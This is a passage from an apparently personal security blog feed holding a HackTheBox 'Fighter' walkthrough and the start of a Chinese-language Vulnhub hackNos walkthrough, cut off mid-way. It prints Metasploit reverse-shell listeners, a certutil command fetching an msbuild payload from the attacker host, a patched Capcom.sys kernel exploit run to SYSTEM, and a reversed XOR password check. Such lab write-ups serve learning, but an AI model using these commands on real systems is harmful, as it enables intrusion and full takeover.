windows/meterpreter/reverse_tcp</span></span><br><span class="line"><span class="string">        (2)     windows/meterpreter/reverse_http</span></span><br><span class="line"><span class="string">        (3)     windows/meterpreter/reverse_https</span></span><br><span class="line"><span class="string">        (4)     Custom PS1 Payload</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Select payload: 1</span></span><br><span class="line"><span class="string">Enter Your Local IP Address (None): 10.10.14.3</span></span><br><span class="line"><span class="string">Enter the listener port (443): 443</span></span><br><span class="line"><span class="string">[*] Generating PSH Payload...</span></span><br><span class="line"><span class="string">[*] Generating MSF Resource Script...</span></span><br><span class="line"><span class="string">[+] Metasploit resource script written to msbuild_nps.rc                                                </span></span><br><span class="line"><span class="string">[+] Payload written to msbuild_nps.xml</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">1. Run &quot;msfconsole -r msbuild_nps.rc&quot; to start listener.</span></span><br><span class="line"><span class="string">2. Choose a Deployment Option (a or b): - See README.md for more information.</span></span><br><span class="line"><span class="string">  a. Local File Deployment:</span></span><br><span class="line"><span class="string">    - %windir%\Microsoft.NET\Framework\v4.0.30319\msbuild.exe &lt;folder_path_here&gt;\msbuild_nps.xml</span></span><br><span class="line"><span class="string">  b. Remote File Deployment:</span></span><br><span class="line"><span class="string">    - wmiexec.py &lt;USER&gt;:&#x27;</span>&lt;PASS&gt;<span class="string">&#x27;@&lt;RHOST&gt; cmd.exe /c start %windir%\Microsoft.NET\Framework\v4.0.30319\msbuild.exe \\&lt;attackerip&gt;\&lt;share&gt;\msbuild_nps.xml                                                                          </span></span><br><span class="line"><span class="string">3. Hack the Planet!!</span></span><br></pre></td></tr></table></figure>

<p>We move into “c:\users\sqlserv” as we have a shell as user sqlserv.</p>
<p>run the command provided by npc payload to start our listener</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># msfconsole -r /root/nps_payload-master/msbuild_nps.rc</span></span><br><span class="line">                                                  </span><br><span class="line">                          <span class="comment">########                  #</span></span><br><span class="line">                      <span class="comment">#################            #</span></span><br><span class="line">                   <span class="comment">######################         #</span></span><br><span class="line">                  <span class="comment">#########################      #</span></span><br><span class="line">                <span class="comment">############################</span></span><br><span class="line">               <span class="comment">##############################</span></span><br><span class="line">               <span class="comment">###############################</span></span><br><span class="line">              <span class="comment">###############################</span></span><br><span class="line">              <span class="comment">##############################</span></span><br><span class="line">                              <span class="comment">#    ########   #</span></span><br><span class="line">                 <span class="comment">##        ###        ####   ##</span></span><br><span class="line">                                      <span class="comment">###   ###</span></span><br><span class="line">                                    <span class="comment">####   ###</span></span><br><span class="line">               <span class="comment">####          ##########   ####</span></span><br><span class="line">               <span class="comment">#######################   ####</span></span><br><span class="line">                 <span class="comment">####################   ####</span></span><br><span class="line">                  <span class="comment">##################  ####</span></span><br><span class="line">                    <span class="comment">############      ##</span></span><br><span class="line">                       <span class="comment">########        ###</span></span><br><span class="line">                      <span class="comment">#########        #####</span></span><br><span class="line">                    <span class="comment">############      ######</span></span><br><span class="line">                   <span class="comment">########      #########</span></span><br><span class="line">                     <span class="comment">#####       ########</span></span><br><span class="line">                       <span class="comment">###       #########</span></span><br><span class="line">                      <span class="comment">######    ############</span></span><br><span class="line">                     <span class="comment">#######################</span></span><br><span class="line">                     <span class="comment">#   #   ###  #   #   ##</span></span><br><span class="line">                     <span class="comment">########################</span></span><br><span class="line">                      <span class="comment">##     ##   ##     ##</span></span><br><span class="line">                            https://metasploit.com</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">       =[ metasploit v5.0.71-dev                          ]</span><br><span class="line">+ -- --=[ 1962 exploits - 1095 auxiliary - 336 post       ]</span><br><span class="line">+ -- --=[ 558 payloads - 45 encoders - 10 nops            ]</span><br><span class="line">+ -- --=[ 7 evasion                                       ]</span><br><span class="line"></span><br><span class="line">[*] Processing /root/nps_payload-master/msbuild_nps.rc <span class="keyword">for</span> ERB directives.</span><br><span class="line">resource (/root/nps_payload-master/msbuild_nps.rc)&gt; use multi/handler</span><br><span class="line">resource (/root/nps_payload-master/msbuild_nps.rc)&gt; <span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">resource (/root/nps_payload-master/msbuild_nps.rc)&gt; <span class="built_in">set</span> LHOST 10.10.14.3</span><br><span class="line">LHOST =&gt; 10.10.14.3</span><br><span class="line">resource (/root/nps_payload-master/msbuild_nps.rc)&gt; <span class="built_in">set</span> LPORT 443</span><br><span class="line">LPORT =&gt; 443</span><br><span class="line">resource (/root/nps_payload-master/msbuild_nps.rc)&gt; <span class="built_in">set</span> ExitOnSession <span class="literal">false</span></span><br><span class="line">ExitOnSession =&gt; <span class="literal">false</span></span><br><span class="line">resource (/root/nps_payload-master/msbuild_nps.rc)&gt; <span class="built_in">set</span> EnableStageEncoding <span class="literal">true</span></span><br><span class="line">EnableStageEncoding =&gt; <span class="literal">true</span></span><br><span class="line">resource (/root/nps_payload-master/msbuild_nps.rc)&gt; exploit -j -z</span><br><span class="line">[*] Exploit running as background job 0.</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.10.14.3:443</span><br></pre></td></tr></table></figure>
<p>start our python HTTP Server to send our file to the target machine</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/hackthebox/fighter<span class="comment"># ls</span></span><br><span class="line">exploit.py  msbuild_nps.xml  ports</span><br><span class="line">root@kali:~/hackthebox/fighter<span class="comment"># python -m SimpleHTTPServer 80</span></span><br><span class="line">Serving HTTP on 0.0.0.0 port 80 ...</span><br></pre></td></tr></table></figure>

<p>download the file using certutil.exe on the target machine</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">PS C:\users\sqlserv&gt; certutil.exe -urlcache -split -f http://10.10.14.3/msbuild_nps.xml msbuild_nps.xml</span><br><span class="line">****  Online  ****</span><br><span class="line">  0000  ...</span><br><span class="line">  1526</span><br><span class="line">CertUtil: -URLCache <span class="built_in">command</span> completed successfully.</span><br><span class="line">PS C:\users\sqlserv&gt; dir</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\users\sqlserv</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime     Length Name                              </span><br><span class="line">----                -------------     ------ ----                              </span><br><span class="line">d-r--        03/11/2017     14:11            Contacts                          </span><br><span class="line">d-r--        03/11/2017     14:11            Desktop                           </span><br><span class="line">d-r--        03/11/2017     14:11            Documents                         </span><br><span class="line">d-r--        03/11/2017     14:11            Downloads                         </span><br><span class="line">d-r--        03/11/2017     14:11            Favorites                         </span><br><span class="line">d-r--        03/11/2017     14:11            Links                             </span><br><span class="line">d-r--        03/11/2017     14:11            Music                             </span><br><span class="line">d-r--        03/11/2017     14:11            Pictures                          </span><br><span class="line">d-r--        03/11/2017     14:11            Saved Games                       </span><br><span class="line">d-r--        03/11/2017     14:11            Searches                          </span><br><span class="line">d-r--        03/11/2017     14:11            Videos                            </span><br><span class="line">-a---        04/06/2020     05:55       5414 msbuild_nps.xml</span><br></pre></td></tr></table></figure>

<p>then run the XML file we uploaded using msbuild.exe</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">PS C:\users\sqlserv&gt; c:\windows\microsoft.net\framework\v4.0.30319\msbuild.exe msbuild_nps.xml</span><br></pre></td></tr></table></figure>

<p>then we got a meterpreter shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; sysinfo</span><br><span class="line">Computer        : FIGHTER</span><br><span class="line">OS              : Windows 2012 R2 (6.3 Build 9600).</span><br><span class="line">Architecture    : x64</span><br><span class="line">System Language : it_IT</span><br><span class="line">Domain          : WORKGROUP</span><br><span class="line">Logged On Users : 2</span><br><span class="line">Meterpreter     : x86/windows</span><br></pre></td></tr></table></figure>

<p>To convert 32-bit session into 64-bit session, we check the processes and find the 64-bit running process. We then migrate our process to a 64-bit process and get a 64-bit session.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; ps</span><br><span class="line">2920  1188  cmd.exe                  x64   0        FIGHTER\sqlserv  C:\Windows\System32\cmd.exe</span><br><span class="line">meterpreter &gt; migrate 2920</span><br><span class="line">[*] Migrating from 1800 to 2920...</span><br><span class="line">[*] Migration completed successfully.</span><br><span class="line">meterpreter &gt; sysinfo</span><br><span class="line">Computer        : FIGHTER</span><br><span class="line">OS              : Windows 2012 R2 (6.3 Build 9600).</span><br><span class="line">Architecture    : x64</span><br><span class="line">System Language : it_IT</span><br><span class="line">Domain          : WORKGROUP</span><br><span class="line">Logged On Users : 2</span><br><span class="line">Meterpreter     : x64/windows</span><br></pre></td></tr></table></figure>

<p>fantastic!!!</p>
<p>still don’t find anything to escalate our privilege. As this machine on street fighter game, we try to google street fighter exploit and find that street fighter 5 has privilege escalation vulnerability. We find that street fighter has a service called Capcom, so we check if street fighter 5 is installed on the target machine.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 1044 created.</span><br><span class="line">Channel 2 created.</span><br><span class="line">Microsoft Windows [Version 6.3.9600]</span><br><span class="line">(c) 2013 Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\users\sqlserv\desktop&gt;sc query capcom</span><br><span class="line">sc query capcom</span><br><span class="line"></span><br><span class="line">SERVICE_NAME: capcom </span><br><span class="line">        TYPE               : 1  KERNEL_DRIVER  </span><br><span class="line">        STATE              : 4  RUNNING </span><br><span class="line">                                (STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)</span><br><span class="line">        WIN32_EXIT_CODE    : 0  (0x0)</span><br><span class="line">        SERVICE_EXIT_CODE  : 0  (0x0)</span><br><span class="line">        CHECKPOINT         : 0x0</span><br><span class="line">        WAIT_HINT          : 0x0</span><br></pre></td></tr></table></figure>

<p>We find this Metasploit exploit here, we try to run it but are unable to get a shell as it gave an error stating that the system was not vulnerable. So we make changes to the code and comment out the section where it checks the OS version.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/hackthebox/fighter<span class="comment"># searchsploit capcom</span></span><br><span class="line">------------------------------------------------------------------------ ----------------------------------------</span><br><span class="line"> Exploit Title                                                          |  Path</span><br><span class="line">                                                                        | (/usr/share/exploitdb/)</span><br><span class="line">------------------------------------------------------------------------ ----------------------------------------</span><br><span class="line">Street Fighter 5 - <span class="string">&#x27;Capcom.sys&#x27;</span> Kernel Execution (Metasploit)           | exploits/windows_x86-64/<span class="built_in">local</span>/40451.rb</span><br><span class="line">------------------------------------------------------------------------ ----------------------------------------</span><br></pre></td></tr></table></figure>

<p>now edit the payload, add “#” at the beginning of the line</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">    <span class="string">&#x27;DisclosureDate&#x27;</span>  =&gt; <span class="string">&#x27;Jan 01 1999&#x27;</span>, <span class="comment"># non-vuln exploit date</span></span><br><span class="line">    <span class="string">&#x27;DefaultTarget&#x27;</span>   =&gt; 0</span><br><span class="line">  &#125;))</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">def check</span><br><span class="line">  <span class="comment">#if sysinfo[&#x27;OS&#x27;] !~ /windows (7|8|10)/i</span></span><br><span class="line">    <span class="comment">#return Exploit::CheckCode::Unknown</span></span><br><span class="line">  <span class="comment">#end</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> sysinfo[<span class="string">&#x27;Architecture&#x27;</span>] !~ /(wow|x)64/i</span><br><span class="line">    <span class="built_in">return</span> Exploit::CheckCode::Safe</span><br><span class="line">  end</span><br></pre></td></tr></table></figure>

<p>now run the exploit again</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf &gt; use exploit/windows/<span class="built_in">local</span>/capcom_sys_exec</span><br><span class="line">msf exploit(windows/<span class="built_in">local</span>/capcom_sys_exec) &gt; <span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(windows/<span class="built_in">local</span>/capcom_sys_exec) &gt; <span class="built_in">set</span> lhost tun0</span><br><span class="line">msf exploit(windows/<span class="built_in">local</span>/capcom_sys_exec) &gt; <span class="built_in">set</span> lport 80</span><br><span class="line">msf exploit(windows/<span class="built_in">local</span>/capcom_sys_exec) &gt; <span class="built_in">set</span> session 2</span><br><span class="line">msf exploit(windows/<span class="built_in">local</span>/capcom_sys_exec)&gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.10.14.3:80 </span><br><span class="line">[*] Launching notepad to host the exploit...</span><br><span class="line">[+] Process 2592 launched.</span><br><span class="line">[*] Reflectively injecting the exploit DLL into 2592...</span><br><span class="line">[*] Injecting exploit into 2592...</span><br><span class="line">[*] Exploit injected. Injecting payload into 2592...</span><br><span class="line">[*] Payload injected. Executing exploit...</span><br><span class="line">[+] Exploit finished, <span class="built_in">wait</span> <span class="keyword">for</span> (hopefully privileged) payload execution to complete.</span><br><span class="line">[*] Sending stage (206403 bytes) to 10.10.10.72</span><br><span class="line">[*] Meterpreter session 3 opened (10.10.14.3:80 -&gt; 10.10.10.72:49187) at 2020-06-04 00:27:24 -0400</span><br></pre></td></tr></table></figure>

<p>now we got system privilege</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; sysinfo</span><br><span class="line">Computer        : FIGHTER</span><br><span class="line">OS              : Windows 2012 R2 (6.3 Build 9600).</span><br><span class="line">Architecture    : x64</span><br><span class="line">System Language : it_IT</span><br><span class="line">Domain          : WORKGROUP</span><br><span class="line">Logged On Users : 2</span><br><span class="line">Meterpreter     : x64/windows</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br></pre></td></tr></table></figure>

<p>then enter a shell and find the flag</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 120 created.</span><br><span class="line">Channel 1 created.</span><br><span class="line">Microsoft Windows [Version 6.3.9600]</span><br><span class="line">(c) 2013 Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;<span class="built_in">cd</span> c:\users\decoder\Desktop</span><br><span class="line"><span class="built_in">cd</span> c:\users\decoder\Desktop</span><br><span class="line"></span><br><span class="line">c:\Users\decoder\Desktop&gt;dir</span><br><span class="line">dir</span><br><span class="line"> Volume <span class="keyword">in</span> drive C has no label.</span><br><span class="line"> Volume Serial Number is BE85-B9AE</span><br><span class="line"></span><br><span class="line"> Directory of c:\Users\decoder\Desktop</span><br><span class="line"></span><br><span class="line">02/05/2018  17:28    &lt;DIR&gt;          .</span><br><span class="line">02/05/2018  17:28    &lt;DIR&gt;          ..</span><br><span class="line">08/01/2018  21:47                34 user.txt</span><br><span class="line">               1 File(s)             34 bytes</span><br><span class="line">               2 Dir(s)  23.804.547.072 bytes free</span><br><span class="line"></span><br><span class="line">c:\Users\decoder\Desktop&gt;<span class="built_in">type</span> user.txt</span><br><span class="line"><span class="built_in">type</span> user.txt</span><br><span class="line">bb6163c184f203af2a31a9c035934297</span><br></pre></td></tr></table></figure>

<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb34.jpg"></li>
</ul>
<p>we got user.txt</p>
<p>We move into c:\users\Administrator\Desktop and find a file called “root.exe”. We run it and find that it asks for a password. There is also a DLL file called “checkdll.dll”, as the password might be checked using this DLL file.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">c:\Users\Administrator\Desktop&gt;dir</span><br><span class="line">dir</span><br><span class="line"> Volume <span class="keyword">in</span> drive C has no label.</span><br><span class="line"> Volume Serial Number is BE85-B9AE</span><br><span class="line"></span><br><span class="line"> Directory of c:\Users\Administrator\Desktop</span><br><span class="line"></span><br><span class="line">08/01/2018  21:44    &lt;DIR&gt;          .</span><br><span class="line">08/01/2018  21:44    &lt;DIR&gt;          ..</span><br><span class="line">24/10/2017  17:02             9.216 checkdll.dll</span><br><span class="line">08/01/2018  23:34             9.728 root.exe</span><br><span class="line">24/10/2017  21:06        13.767.776 vc_redist.x86.exe</span><br><span class="line">               3 File(s)     13.786.720 bytes</span><br><span class="line">               2 Dir(s)  23.804.547.072 bytes free</span><br><span class="line"></span><br><span class="line">c:\Users\Administrator\Desktop&gt;root.exe</span><br><span class="line">root.exe</span><br><span class="line">root.exe &lt;password&gt;</span><br></pre></td></tr></table></figure>

<p>We download both the files into our system using meterpreter.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; <span class="built_in">cd</span> Users/Administrator/Desktop</span><br><span class="line">meterpreter &gt; <span class="built_in">pwd</span></span><br><span class="line">C:\Users\Administrator\Desktop</span><br><span class="line">meterpreter &gt; download root.exe /root/hackthebox/fighter</span><br><span class="line">[*] Downloading: root.exe -&gt; /root/hackthebox/fighter/root.exe</span><br><span class="line">[*] Downloaded 9.50 KiB of 9.50 KiB (100.0%): root.exe -&gt; /root/hackthebox/fighter/root.exe</span><br><span class="line">[*] download   : root.exe -&gt; /root/hackthebox/fighter/root.exe</span><br><span class="line">meterpreter &gt; download checkdll.dll /root/hackthebox/fighter</span><br><span class="line">[*] Downloading: checkdll.dll -&gt; /root/hackthebox/fighter/checkdll.dll</span><br><span class="line">[*] Downloaded 9.00 KiB of 9.00 KiB (100.0%): checkdll.dll -&gt; /root/hackthebox/fighter/checkdll.dll</span><br><span class="line">[*] download   : checkdll.dll -&gt; /root/hackthebox/fighter/checkdll.dll</span><br></pre></td></tr></table></figure>

<p>reverse engineer them using IDA and find that this program XOR’s 9 with each character of the variable aFmFeholH. Now analyzing with IDA tells us that the variable contains “FmfEhO1}h”.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">public check</span><br><span class="line">check proc near</span><br><span class="line"></span><br><span class="line">arg_0= dword ptr  8</span><br><span class="line"></span><br><span class="line">push    ebp</span><br><span class="line">mov     ebp, esp</span><br><span class="line">mov     edx, [ebp+arg_0]</span><br><span class="line">xor     eax, eax</span><br><span class="line">sub     edx, offset aFmFeholH ; <span class="string">&quot;Fm`fEhOl&#125;h&quot;</span></span><br><span class="line">xchg    ax, ax</span><br></pre></td></tr></table></figure>

<p>伪代码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">signed int __cdecl check(int a1)</span><br><span class="line">&#123;</span><br><span class="line">  int v1; // eax</span><br><span class="line"></span><br><span class="line">  v1 = 0;</span><br><span class="line">  <span class="keyword">while</span> ( (*(_BYTE *)(a1 + v1) ^ 9) == aFmFeholH[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (unsigned int)++v1 &gt;= 0xA )</span><br><span class="line">      <span class="built_in">return</span> 1;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">return</span> 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>So we create a c program that XOR’s 9 with each character of the string.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Fm`fEhOl&#125;h</span><br></pre></td></tr></table></figure>

<p>check.c</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"></span><br><span class="line">int main(int argc, char **argv) &#123;</span><br><span class="line">char aFmFeholH[15] = <span class="string">&quot;Fm`fEhOl&#125;h&quot;</span>;</span><br><span class="line">int v1;</span><br><span class="line">    <span class="keyword">for</span> (v1=0;v1&lt;11;v1++)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,(*(int *) (aFmFeholH + v1) ^ 9));</span><br><span class="line">    puts(<span class="string">&quot;&quot;</span>);</span><br><span class="line"><span class="built_in">return</span> 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>compile and run the file and get the password to be “OdioLaFeta”.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/hackthebox/fighter<span class="comment"># gcc check.c -o check</span></span><br><span class="line">root@kali:~/hackthebox/fighter<span class="comment"># ./check </span></span><br><span class="line">OdioLaFeta</span><br></pre></td></tr></table></figure>

<p>provide the password to the root.exe we get our final flag</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:\Users\Administrator\Desktop&gt;root.exe OdioLaFeta</span><br><span class="line">root.exe OdioLaFeta</span><br><span class="line">d801c1e9bd9a02f8fb30d8bd3be314c1</span><br></pre></td></tr></table></figure>

<ul>
<li><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb35.jpg"></p>
</li>
<li><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb36.jpg"></p>
</li>
<li><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb37.jpg"></p>
</li>
</ul>
<p>what a crazy box…</p>
<h4 id="Summary-of-knowledge"><a href="#Summary-of-knowledge" class="headerlink" title="Summary of knowledge"></a>Summary of knowledge</h4><ul>
<li>masscan quick port scan</li>
<li>burp intruder fuzz subdomains</li>
<li>sql injection python shell script</li>
<li>Construct xp_cmdshell statement to spawn a shell</li>
<li>use nps payload bypass a firewall</li>
<li>use “certutil.exe -urlcache -split -f” to download files</li>
<li>turn 32-bits session to 64-bits session</li>
<li>Street Fighter 5 - ‘Capcom.sys’ Kernel Execution (Metasploit)</li>
<li>modify metasploit module ruby scripts</li>
<li>reverse engineer .dll file then write .c decrypt program</li>
</ul>
<h4 id="Contact-me"><a href="#Contact-me" class="headerlink" title="Contact me"></a>Contact me</h4><ul>
<li>QQ: 1185151867</li>
<li>twitter: <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9mZGx1Y2lmZXIxMQ==">https://twitter.com/fdlucifer11<i class="fa fa-external-link-alt"></i></span></li>
<li>github: <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==">https://github.com/FDlucifer<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p><font color="blue">I’m lucifer11, a ctfer, reverse engineer, ioter, red teamer, coder, gopher, pythoner, AI lover, security reseacher, hacker, bug hunter and more…</font></p>
]]></content>
      <categories>
        <category>HackTheBox walkthrough</category>
      </categories>
      <tags>
        <tag>HackTheBox靶机练习</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub靶机渗透[hackNos-Os-hackNos-1]</title>
    <url>/2019/12/22/hackNos-Os-hackNos-1/</url>
    <content><![CDATA[<p>名称：hackNos：Os-hackNos<br>发布日期：2019年11月27日</p>
<ul>
<li>Download: <span class="exturl" data-url="aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL29wZW4/aWQ9MUlPcFhpYmYtQTlpU3dvRzRJVzhIZFhGdkRCRm95N04x">https://drive.google.com/open?id=1IOpXibf-A9iSwoG4IW8HdXFvDBFoy7N1<i class="fa fa-external-link-alt"></i></span></li>
<li>Download (Mirror): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9oYWNrbm9zL09zLWhhY2tOb3MtMS5vdmE=">https://download.vulnhub.com/hacknos/Os-hackNos-1.ova<i class="fa fa-external-link-alt"></i></span></li>
<li>Download (Torrent): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9oYWNrbm9zL09zLWhhY2tOb3MtMS5vdmEudG9ycmVudA==">https://download.vulnhub.com/hacknos/Os-hackNos-1.ova.torrent<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p>描述：<br>难度：容易中级<br>flag：2个flag第一个user.txt和第二个root.txt<br>学习：利用 Web应用程序 枚举 权限提升</p>
<a id="more"></a>

<h3 id="网络配置"><a href="#网络配置" class="headerlink" title="网络配置"></a>网络配置</h3><p>配置和hackNos-Os-hackNos-2-1一样，<a href="https://fdlucifer.github.io/2019-12-19-hackNos-Os-hackNos-2-1.html">传送门</a></p>
<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>nmap扫描一波</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sn -v 192.168.56.0/24</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.56.103</span><br><span class="line">Host is up (0.00036s latency).</span><br><span class="line">MAC Address: 08:00:27:F9:4E:C0 (Oracle VirtualBox virtual NIC)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -A -v -sV -Pn -T4 --script=vuln 192.168.56.103</span></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_http-csrf: Couldn<span class="string">&#x27;t find any CSRF vulnerabilities.</span></span><br><span class="line"><span class="string">|_http-dombased-xss: Couldn&#x27;</span>t find any DOM based XSS.</span><br><span class="line">|_http-server-header: Apache/2.4.18 (Ubuntu)</span><br><span class="line">|_http-stored-xss: Couldn<span class="string">&#x27;t find any stored XSS vulnerabilities.</span></span><br></pre></td></tr></table></figure>

<p>可以看到开放了22的ssh端口和80端口</p>
<p>dirb扫一波</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># dirb http://192.168.56.103/</span></span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">DIRB v2.22    </span><br><span class="line">By The Dark Raver</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">START_TIME: Sun Dec 22 21:06:26 2019</span><br><span class="line">URL_BASE: http://192.168.56.103/</span><br><span class="line">WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">GENERATED WORDS: 4612                                                          </span><br><span class="line"></span><br><span class="line">---- Scanning URL: http://192.168.56.103/ ----</span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.103/drupal/                                                          </span><br><span class="line">+ http://192.168.56.103/index.html (CODE:200|SIZE:11321)                                              </span><br><span class="line">+ http://192.168.56.103/server-status (CODE:403|SIZE:279)                                             </span><br><span class="line">                                                                                                      </span><br><span class="line">---- Entering directory: http://192.168.56.103/drupal/ ----</span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.103/drupal/includes/                                                 </span><br><span class="line">+ http://192.168.56.103/drupal/index.php (CODE:200|SIZE:7687)                                         </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.103/drupal/misc/                                                     </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.103/drupal/modules/                                                  </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.103/drupal/profiles/                                                 </span><br><span class="line">+ http://192.168.56.103/drupal/robots.txt (CODE:200|SIZE:2189)                                        </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.103/drupal/scripts/                                                  </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.103/drupal/sites/                                                    </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.103/drupal/themes/                                                   </span><br><span class="line">+ http://192.168.56.103/drupal/web.config (CODE:200|SIZE:2200)                                        </span><br><span class="line">+ http://192.168.56.103/drupal/xmlrpc.php (CODE:200|SIZE:42)</span><br></pre></td></tr></table></figure>

<p>发现存在drupal服务</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub81.jpg"></p>
<p>dirbuster再爆破一波.txt后缀的文件</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub82.jpg"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://192.168.56.103/alexander.txt</span><br></pre></td></tr></table></figure>

<p>base64字符串</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">KysrKysgKysrKysgWy0+KysgKysrKysgKysrPF0gPisrKysgKysuLS0gLS0tLS0gLS0uPCsgKytbLT4gKysrPF0gPisrKy4KLS0tLS0gLS0tLjwgKysrWy0gPisrKzwgXT4rKysgKysuPCsgKysrKysgK1stPi0gLS0tLS0gLTxdPi0gLS0tLS0gLS0uPCsKKytbLT4gKysrPF0gPisrKysgKy48KysgKysrWy0gPisrKysgKzxdPi4gKysuKysgKysrKysgKy4tLS0gLS0tLjwgKysrWy0KPisrKzwgXT4rKysgKy48KysgKysrKysgWy0+LS0gLS0tLS0gPF0+LS4gPCsrK1sgLT4tLS0gPF0+LS0gLS4rLi0gLS0tLisKKysuPA==</span><br></pre></td></tr></table></figure>

<p>将base64字符串解密</p>
